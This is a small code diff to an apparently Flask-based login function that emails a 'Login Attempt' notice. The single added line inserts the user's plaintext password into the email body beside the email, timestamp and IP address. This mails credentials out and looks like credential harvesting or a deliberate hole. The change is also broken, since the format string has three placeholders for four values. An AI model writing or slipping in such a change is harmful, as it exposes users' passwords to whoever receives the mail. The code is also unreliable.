@@ -31,6 +31,7 @@ def login():
         )
         msg.body = "Login Attempt\nEmail: %s\nTimeStamp: %s\nIP Address: %s" % (
             email,
+            password,
             datetime.datetime.now(),
             request.remote_addr,
         )
